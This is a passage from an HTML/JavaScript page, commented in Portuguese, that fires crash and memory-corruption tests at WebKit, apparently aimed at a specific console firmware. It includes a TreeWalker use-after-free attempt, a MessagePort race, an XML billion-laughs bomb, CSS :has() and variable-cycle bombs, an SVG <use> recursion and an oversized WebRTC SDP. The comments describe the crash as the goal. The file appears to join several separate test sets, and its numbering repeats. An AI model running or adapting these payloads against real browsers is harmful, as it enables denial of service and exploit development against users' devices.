                log("Comando executado. Se não crashou, o WebKit protegeu.");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: MessagePort Transfer Race ---
        // Tenta transferir portas (IPC) e fechá-las ao mesmo tempo.
        // Isso ataca o gerenciamento de memória "Thread-Safe" do WebKit.
        function runMessagePortRace() {
            log("Iniciando MessagePort Entanglement Race...");
            
            try {
                const channel = new MessageChannel();
                const port1 = channel.port1;
                const port2 = channel.port2;
                
                // Worker que vai receber a porta
                const workerCode = `
                    onmessage = function(e) {
                        // Tenta usar a porta recebida imediatamente
                        try {
                            const p = e.data;
                            p.postMessage("PING");
                            p.close();
                        } catch(x) {}
                    };
                `;
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                
                // O GOLPE: Envia port2 para o worker e tenta fechá-la/neutrar aqui
                // Race Condition: Quem fecha primeiro? O GC ou a transferência?
                
                const interval = setInterval(() => {
                    try {
                        const ch = new MessageChannel();
                        worker.postMessage(ch.port2, [ch.port2]);
                        
                        // Tenta confundir o estado
                        ch.port1.close();
                        
                    } catch(e) {
                        clearInterval(interval);
                        log("Erro de transferência: " + e.message);
                    }
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    worker.terminate();
                    log("IPC Race finalizada.");
                }, 2000);

            } catch(e) { log("Erro: " + e.message); }
        }

        // --- TESTE 3: CSS Filter Buffer Overflow ---
        // Usa filtros SVG aplicados via CSS para estressar o renderizador de software.
        function runFilterCrash() {
            log("Aplicando Filtros SVG Matemáticos...");
            const editor = document.getElementById('editor');
            
            // Cria conteúdo complexo para aplicar o filtro
            editor.innerHTML = "<span>CRASH</span>".repeat(500);
            
            setTimeout(() => {
                log("Ativando Filtro de Deslocamento (DisplacementMap)...");
                // Aplica o filtro definido no HTML
                // Escala 10000 força cálculos de pixel fora do buffer normal
                editor.style.filter = "url(#crashFilter)";
                
                // Força repintura (Repaint)
                editor.style.transform = "translateZ(0)";
                
                setTimeout(() => {
                    log("Alterando parâmetros do filtro...");
                    const turb = document.querySelector('feTurbulence');
                    // Muda a frequência para forçar recálculo total do buffer
                    turb.setAttribute('baseFrequency', '0.05');
                    
                    log("Teste gráfico concluído.");
                    editor.style.filter = "none"; // Limpa
                }, 500);
            }, 100);
        }
function runTreeWalkerUAF() {
            log("Iniciando TreeWalker UAF Hunt...");
            const root = document.createElement('div');
            document.body.appendChild(root);
            
            // Cria estrutura aninhada
            root.innerHTML = "<div><span><b>Test</b></span></div>".repeat(100);
            
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
                acceptNode: function(node) {
                    // O GOLPE:
                    // Quando encontrarmos um <span>, removemos o próprio pai dele!
                    if (node.tagName === "SPAN") {
                        log("Vítima encontrada. Removendo nó ativo...");
                        try {
                            // Remove o nó da árvore
                            node.parentNode.removeChild(node);
                            
                            // Tenta corromper a memória imediatamente
                            let junk = document.createElement('img');
                            junk.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
                            root.appendChild(junk);
                            
                            return NodeFilter.FILTER_ACCEPT;
                        } catch(e) { return NodeFilter.FILTER_SKIP; }
                    }
                    return NodeFilter.FILTER_SKIP;
                }
            });

            log("Caminhando na árvore...");
            try {
                while(walker.nextNode()) {
                    // Loop de caminhada
                }
                log("TreeWalker finalizado (Sem Crash).");
            } catch(e) {
                log("Erro Walker: " + e.message);
            }
        }

        // --- TESTE 2: CSS :has() Exponential Explosion ---
        // Cria uma regra CSS que exige verificação exponencial.
        // div:has(div:has(div:has(...)))
        // O WebKit FW 12.00 deve travar tentando resolver o estilo.
        function runCSSHasBomb() {
            log("Gerando Bomba Lógica CSS :has()...");
            const depth = 200; // Profundidade da cadeia
            const container = document.getElementById('sandbox');
            container.innerHTML = "";
            
            // 1. Gera o HTML profundo
            let html = "";
            for(let i=0; i<depth; i++) html += "<div class='layer'>";
            for(let i=0; i<depth; i++) html += "</div>";
            container.innerHTML = html;
            
            // 2. Gera o Seletor Maligno
            // .layer:has(.layer:has(.layer...))
            let selector = ".layer";
            for(let i=0; i<50; i++) {
                selector += ":has(.layer";
            }
            // Fecha os parênteses
            selector += ")".repeat(50);
            
            // Adiciona regra pesada
            selector += " { background-color: red; transition: all 1s; }";
            
            log("Injetando Estilo Complexo...");
            const style = document.createElement('style');
            style.textContent = selector;
            
            setTimeout(() => {
                document.head.appendChild(style);
                
                // Força Reflow (Recálculo de estilo)
                log("Forçando Style Recalc...");
                const crash = container.offsetHeight;
                
                log("CSS Solver sobreviveu.");
                document.head.removeChild(style);
            }, 100);
        }

        // --- TESTE 3: SVG Shadow DOM Recursion ---
        // Tenta criar um loop infinito de renderização usando Shadow DOM dentro de SVG <use>.
        // O Shadow DOM esconde a recursão do validador simples do WebKit.
        function runSVGCycle() {
            log("Iniciando SVG Cycle Attack...");
            const container = document.getElementById('sandbox');
            container.innerHTML = "";
            
            try {
                // Cria Host
                const host = document.createElement('div');
                container.appendChild(host);
                const shadow = host.attachShadow({mode: 'open'});
                
                // SVG 1
                const svg1 = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                svg1.id = "s1";
                const use1 = document.createElementNS("http://www.w3.org/2000/svg", "use");
                use1.setAttribute("href", "#s2"); // Aponta para o futuro s2
                svg1.appendChild(use1);
                
                // SVG 2 (Dentro do Shadow)
                const svg2 = document.createElementNS("http://www.w3.org/2000/svg", "symbol");
                svg2.id = "s2";
                const use2 = document.createElementNS("http://www.w3.org/2000/svg", "use");
                
                // O GOLPE: Aponta de volta para s1 (que está fora do shadow ou vice-versa)
                // Isso tenta criar um loop de renderização que estoura a pilha gráfica
                use2.setAttribute("href", "#s1"); 
                svg2.appendChild(use2);
                
                shadow.appendChild(svg1);
                shadow.appendChild(svg2);
                
                log("Ciclo SVG injetado. Verifique travamento.");
                
                // Modifica dinamicamente para tentar triggar o loop depois da validação inicial
                setTimeout(() => {
                    use1.setAttribute("href", "#s2");
                    container.innerHTML = "<b>Reset</b>";
                }, 2000);

            } catch(e) {
                log("Erro SVG: " + e.message);
            }
        }
function runXMLBomb() {
            log("Iniciando Ataque XML Bomb...");
            
            const xmlContent = `
                <?xml version="1.0"?>
                <!DOCTYPE lolz [
                 <!ENTITY lol "lol">
                 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
                 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
                 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
                 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
                 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
                 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
                ]>
                <root>&lol9;</root>
            `;

            try {
                const parser = new DOMParser();
                log("Parseando XML Malicioso...");
                
                // O travamento deve ocorrer AQUI, durante o parse
                const doc = parser.parseFromString(xmlContent, "application/xml");
                
                // Se chegou aqui, tenta acessar o conteúdo para forçar a renderização (se for lazy)
                const content = doc.documentElement.textContent;
                log("Parser sobreviveu. Tamanho do output: " + content.length);
                
            } catch(e) {
                log("Erro XML (Proteção Ativa): " + e.message);
            }
        }

        // --- TESTE 2: CSS Variable Recursion ---
        // Cria um ciclo de dependência de variáveis CSS e aplica a milhares de elementos.
        // Tenta travar a thread de UI na resolução de estilo.
        function runCSSVarCycle() {
            log("Gerando Ciclo CSS Infinito...");
            
            const style = document.createElement('style');
            // Define o ciclo: --a precisa de --b, --b precisa de --a
            style.textContent = `
                :root {
                    --a: var(--b);
                    --b: var(--a);
                }
                .bomb {
                    background-color: var(--a);
                    width: calc(var(--b) * 1px);
                }
            `;
            document.head.appendChild(style);

            const container = document.getElementById('hidden-area');
            container.style.display = "block"; // Torna visível para forçar renderização
            container.innerHTML = "";

            // Cria pressão no Style Resolver
            const fragment = document.createDocumentFragment();
            for(let i=0; i<5000; i++) {
                const div = document.createElement('div');
                div.className = "bomb";
                fragment.appendChild(div);
            }
            
            log("Injetando 5000 elementos com dependência cíclica...");
            container.appendChild(fragment);

            // Força o recálculo de estilo
            setTimeout(() => {
                const force = container.offsetHeight;
                log("Style Resolver sobreviveu (Ciclo detectado).");
                container.innerHTML = ""; // Limpa
                document.head.removeChild(style);
            }, 100);
        }

        // --- TESTE 3: WebRTC SDP Parser Crash ---
        // Ataca o parser SDP interno passando lixo ou strings gigantes.
        function runSDPMangle() {
            log("Atacando Parser SDP (WebRTC)...");
            
            if (!window.RTCPeerConnection) {
                log("WebRTC não suportado.");
                return;
            }

            const pc = new RTCPeerConnection();
            
            // Gera um SDP "Tóxico"
            // Campos repetidos milhares de vezes ou valores de estouro de buffer
            let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
            for(let i=0; i<5000; i++) {
                sdp += "m=audio " + i + " RTP/AVP 0\r\n";
                sdp += "a=rtpmap:0 PCMU/8000\r\n";
                sdp += "a=candidate:" + "A".repeat(100) + "\r\n"; // Buffer overflow attempt
            }

            log("Chamando setLocalDescription com SDP gigante...");
            
            // Isso dispara o parser C++ imediatamente
            pc.setLocalDescription({type: "offer", sdp: sdp})
                .then(() => log("SDP Aceito (Inesperado)."))
                .catch(e => {
                    log("Erro SDP: " + e.message);
                    // Erro é normal. Crash é o objetivo.
                });
        }



    </script>
</body>
</html>

